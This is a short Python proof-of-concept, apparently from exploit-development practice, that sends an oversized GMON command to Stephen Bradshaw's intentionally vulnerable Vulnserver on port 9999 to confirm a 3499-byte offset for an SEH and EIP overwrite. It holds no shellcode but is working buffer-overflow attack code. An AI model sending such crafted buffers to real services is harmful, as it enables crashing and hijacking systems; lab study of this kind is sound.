#########################################################################################
# Title: Vulnserver GMON command SEH exploit
# Author: Marco Lugo
# Description: confirm that 3499 is the right offset to overwrite the EIP register
#              EIP is be overwritten by 4 42s (Bs), we own EIP.
#
#              It is a SEH overwrite, and POP-POP-RET would take us to our buffer, which is
#              only "DDDDBBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCC" at 0x00B8EE4C
#
#              To get Stephen Bradshaw's Vulnserver, visit:
#              http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

import socket
import sys
import os

target_ip = sys.argv[1]
buffer = 'GMON /.:/' 
pattern = '\x41'*1999 + '\x44'*1500 + '\x42'*4 + '\x43'*1697
buffer += pattern

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()


